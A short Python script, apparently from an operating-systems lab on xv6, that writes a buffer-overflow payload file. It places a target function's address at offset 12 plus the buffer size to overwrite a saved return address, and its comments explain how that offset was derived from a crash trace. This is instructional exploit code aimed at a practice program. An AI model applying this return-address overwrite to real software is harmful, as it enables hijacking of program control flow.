import sys

# buffer_size as set in the C program is given as input in specification
buffer_size = int(sys.argv[1])

# we get the foo_address by printf(1, "%x", &foo);
foo_address = "\x00"

# pid 3 buffer_overflow: trap 14 err 4 on cpu 0 eip 0x14131211 addr 0x14131211--kill proc
# trap %eip = 0x14131211 this means 0x11 is fed to the last byte
# which was out[0x10] or out[16] when buffer was 4 byte, this means 
# now we put the foo_address in out[12+buffer_size]
return_byte = 12+buffer_size

out = "" 
for i in range(100):
	if i == return_byte: 
		out += foo_address
	else:
		out += chr(i+1)
f = open("payload", "w")
f.write(out)
f.close()

